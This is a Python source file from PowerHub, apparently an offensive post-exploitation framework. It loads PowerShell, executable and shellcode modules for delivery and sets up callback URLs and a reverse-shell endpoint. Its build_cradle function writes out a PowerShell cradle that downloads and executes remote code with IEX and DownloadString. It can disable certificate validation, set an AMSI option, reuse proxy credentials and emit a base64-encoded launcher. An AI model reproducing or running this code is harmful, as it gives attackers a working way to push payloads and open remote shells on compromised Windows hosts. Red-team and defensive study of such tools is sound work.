from powerhub.args import args
from powerhub.directories import BASE_DIR, MOD_DIR
import os
import binascii


def import_module_type(mod_type, filter=lambda x: True):
    """Load modules of one type from file to memory

    'filter' is applied to the basename of each file. The file will only be
    added if it is returns True. 'mod_type' must be one of 'ps1', 'exe' or
    'shellcode'.
    """

    assert mod_type in ['ps1', 'exe', 'shellcode']

    directory = os.path.join(MOD_DIR, mod_type)
    result = []
    for dirName, subdirList, fileList in os.walk(directory, followlinks=True):
        for fname in fileList:
            filename = os.path.join(dirName, fname)
            if filter(fname):
                with open(filename, "br") as f:
                    d = f.read()
                result.append(Module(
                    filename.replace(os.path.join(BASE_DIR, 'modules'), ''),
                    mod_type,
                    d,
                ))
    return result


def import_modules():
    """Import all modules and returns them as a list

    """
    ps_modules = import_module_type(
        'ps1',
        filter=lambda fname: "tests" not in fname and fname.endswith('.ps1')
    )
    exe_modules = import_module_type(
        'exe',
        filter=lambda fname: fname.endswith('.exe'),
    )
    shellcode_modules = import_module_type('shellcode')

    result = ps_modules + exe_modules + shellcode_modules
    for i, m in enumerate(result):
        m.n = i

    return result


class Module(object):
    """Represents a module

    """

    def __init__(self, name, type, code):
        self.name = name
        self.short_name = name[len(MOD_DIR)+1:]
        self.type = type
        self._code = code
        self.code = ""
        self.active = False
        self.n = -1

    def activate(self):
        self.active = True
        self.code = self._code

    def deactivate(self):
        self.active = False
        self.code = ""

    def __dict__(self):
        return {
            "Name": self.short_name,
            "BaseName": os.path.basename(self.name),
            "Code": self.code,
            "N": self.n,
            "Type": self.type,
            "Loaded": "$True" if self.code else "$False",
        }


modules = import_modules()

callback_urls = {
    'http': 'http://%s:%d/%s' % (
        args.URI_HOST,
        args.URI_PORT if args.URI_PORT else args.LPORT,
        args.URI_PATH+'/' if args.URI_PATH else '',
    ),
    'https': 'https://%s:%d/%s' % (
        args.URI_HOST,
        args.URI_PORT if args.URI_PORT else args.SSL_PORT,
        args.URI_PATH+'/' if args.URI_PATH else '',
    ),
}

# TODO consider https
webdav_url = 'http://%s:%d/webdav' % (
    args.URI_HOST,
    args.LPORT,
)

endpoints = {
    'hub': "h",
    'reverse_shell': "r",
}


def build_cradle(get_args, flavor="hub"):
    result = ""
    from powerhub.tools import FINGERPRINT
    if get_args['GroupTransport'] == 'https':
        if get_args['RadioNoVerification'] == 'true':
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={$true};")
        elif get_args['RadioFingerprint'] == 'true':
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={param($1,$2);"
                       "$2.Thumbprint -eq '%s'};" %
                       FINGERPRINT.replace(':', ''))
        elif get_args['RadioCertStore'] == 'true':
            pass
        if get_args['CheckboxTLS1.2'] == 'true':
            result += ("[Net.ServicePointManager]::SecurityProtocol="
                       "[Net.SecurityProtocolType]::Tls12;")

    if get_args['GroupTransport'].startswith('http'):
        result += "$K=New-Object Net.WebClient;"
        if get_args['CheckboxProxy'] == 'true':
            result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                       "$K.Proxy.Credentials=[Net.CredentialCache]::"
                       "DefaultCredentials;")
        if not get_args['GroupClipExec'] == 'none':
            clip_exec = "&c=%s" % get_args['GroupClipExec']
        else:
            clip_exec = ""
        result += "IEX $K.DownloadString('%s0?t=%s&f=%s&a=%s%s');"
        result = result % (
            callback_urls[get_args['GroupTransport']],
            get_args['GroupTransport'],
            endpoints[flavor],
            get_args['GroupAmsi'],
            clip_exec,
        )

    if get_args['GroupLauncher'] == 'cmd':
        result = 'powershell.exe "%s"' % result
    elif get_args['GroupLauncher'] == 'cmd_enc':
        result = 'powershell.exe -Enc %s' % \
            binascii.b2a_base64(result.encode('utf-16le')).decode()
    elif get_args['GroupLauncher'] == 'bash':
        result = result.replace('$', '\\$')
        result = '"powershell.exe \\\"%s\\\""' % result
    return result
